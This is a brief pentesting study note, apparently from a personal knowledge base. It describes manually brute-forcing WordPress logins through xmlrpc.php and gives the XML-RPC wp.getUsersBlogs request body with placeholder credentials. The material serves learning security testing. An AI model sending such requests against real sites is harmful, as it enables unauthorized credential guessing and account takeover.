---
tags:
  - "#web"
  - "#scripting"
  - "#bash"
  - "#tools"
  - "#wordpress"
---
If we want to use brute forcing to discover valid credentials on a [[WordPress]] web page as the same way [[WPScan]] does but manually, we have to make a POST query to the file **xmlrpc.php** with this structure:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>\{\{your username\}\}</value></param>
<param><value>\{\{your password\}\}</value></param>
</params>
</methodCall>   `
```

![[Pasted image 20250126173135.png#center| ]]